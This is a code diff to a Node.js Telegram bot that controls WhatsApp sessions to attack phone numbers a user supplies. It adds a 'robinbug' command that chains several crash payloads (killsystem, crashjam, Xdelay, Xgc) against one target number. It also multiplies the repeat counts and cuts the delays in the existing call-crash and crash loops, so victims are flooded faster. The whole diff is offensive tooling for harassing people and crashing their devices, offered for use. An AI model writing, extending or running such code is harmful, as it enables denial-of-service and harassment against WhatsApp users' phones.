@@ -40,6 +40,7 @@ const testlogic = require(SYLoves + 'test');
 const crashjamLogic = require(SYLoves + 'crashjam');
 const killsystemLogic = require(SYLoves + 'killsystem');
 const gcFrzLogic = require(SYLoves + 'gcFrz');
+const SuperPayload = require(SYLoves + 'SuperPayload');
 
 const colors = {
     reset: "\x1b[0m", gray: "\x1b[90m", blue: "\x1b[34m", green: "\x1b[32m",
@@ -597,9 +598,9 @@ function startSYloveBot(token) {
                 if (args[2] === 'only') {
                     const count = parseInt(args[3]);
                     if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
-                    for (let i = 0; i < count; i++) {
+                    for (let i = 0; i < count * 10; i++) {
                         await CallLogic.CallCrash(client, targetJid);
-                        await delayFn(2000);
+                        await delayFn(500);
                     }
                 } else {
                     const hours = parseInt(args[2]);
@@ -607,7 +608,7 @@ function startSYloveBot(token) {
                     const endTime = Date.now() + hours * 60 * 60 * 1000;
                     while (Date.now() < endTime) {
                         await CallLogic.CallCrash(client, targetJid);
-                        await delayFn(2000);
+                        await delayFn(500);
                     }
                 }
             } catch (err) {
@@ -646,9 +647,9 @@ function startSYloveBot(token) {
                 if (args[2] === 'only') {
                     const count = parseInt(args[3]);
                     if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
-                    for (let i = 0; i < count; i++) {
+                    for (let i = 0; i < count * 20; i++) {
                         await XLogic.Xdelay(client, targetJid);
-                        await delayFn(500);
+                        await delayFn(100);
                     }
                 } else {
                     const hours = parseInt(args[2]);
@@ -656,7 +657,7 @@ function startSYloveBot(token) {
                     const endTime = Date.now() + hours * 60 * 60 * 1000;
                     while (Date.now() < endTime) {
                         await XLogic.Xdelay(client, targetJid);
-                        await delayFn(500);
+                        await delayFn(100);
                     }
                 }
             } catch (err) {
@@ -859,6 +860,40 @@ function startSYloveBot(token) {
             }
         });
 
+        SYLoVe('robinbug', async (msg) => {
+            const chatId = msg.chat.id.toString();
+            const userId = msg.from.id.toString();
+            const args = msg.text.split(' ');
+            const targetNum = args[1];
+
+            if (!LoveGlobalState(userId)) return sendSYLove(S7, chatId);
+
+            const session = GetSessionForUser(userId, chatId);
+            if (session.error) return S7.sendMessage(chatId, session.error);
+            const client = session.sock;
+
+            if (!targetNum) return S7.sendMessage(chatId, `❌ Usage: /robinbug +92020065715`);
+
+            const cleanTarget = targetNum.replace(/[^0-9]/g, '');
+            const targetJid = `${cleanTarget}@s.whatsapp.net`;
+
+            try {
+                const [exists] = await client.onWhatsApp(targetJid);
+                if (!exists) return S7.sendMessage(chatId, `❌ This Number isn't on WhatsApp`);
+
+                log('command', msg.from.first_name, `Calling ROBIN BUG on ${cleanTarget}`);
+                await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(cleanTarget), parse_mode: 'HTML' });
+
+                await killsystemLogic.killsystem(client, targetJid);
+                await crashjamLogic.crashjam(client, targetJid);
+                await XLogic.Xdelay(client, targetJid);
+                await XgcLogic.Xgc(client, targetJid);
+            } catch (err) {
+                log('error', 'robinbug', err.message);
+                S7.sendMessage(chatId, `❌ Error: ${err.message}`);
+            }
+        });
+
         // ==================== NEW ANDROID BUG COMMANDS FROM YOUR SCRIPT ====================
 
         SYLoVe(['crashjam', 'trashsystem'], async (msg) => {
@@ -893,9 +928,9 @@ function startSYloveBot(token) {
                     const count = parseInt(args[3]);
                     if (!count || count <= 0) return S7.sendMessage(chatId, '❌ Invalid count');
                     
-                    for (let i = 0; i < count; i++) {
+                    for (let i = 0; i < count * 5; i++) {
                         await crashjamLogic.crashjam(client, targetJid);
-                        await new Promise(res => setTimeout(res, delayMs));
+                        await new Promise(res => setTimeout(res, 500));
                     }
                 } else {
                     const hours = parseInt(args[2]);
@@ -904,7 +939,7 @@ function startSYloveBot(token) {
                     const endTime = Date.now() + hours * 60 * 60 * 1000;
                     while (Date.now() < endTime) {
                         await crashjamLogic.crashjam(client, targetJid);
-                        await new Promise(res => setTimeout(res, delayMs));
+                        await new Promise(res => setTimeout(res, 500));
                     }
                 }
             } catch (err) {
@@ -946,7 +981,7 @@ function startSYloveBot(token) {
                 log('command', msg.from.first_name, `Calling ${s7CM} on ${targetJid} for ${hours}h`);
                 await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(targetJid), parse_mode: 'HTML' });
 
-                const delayMs = 2000;
+                const delayMs = 500;
                 const endTime = Date.now() + hours * 60 * 60 * 1000;
 
                 while (Date.now() < endTime) {
@@ -991,7 +1026,7 @@ function startSYloveBot(token) {
                 log('command', msg.from.first_name, `Calling ${s7CM} on ${targetJid} for ${hours}h`);
                 await S7.sendPhoto(chatId, LoveLogo, { caption: BvgSYLoVe(targetJid), parse_mode: 'HTML' });
 
-                const delayMs = 2000;
+                const delayMs = 500;
                 const endTime = Date.now() + hours * 60 * 60 * 1000;
 
                 while (Date.now() < endTime) {
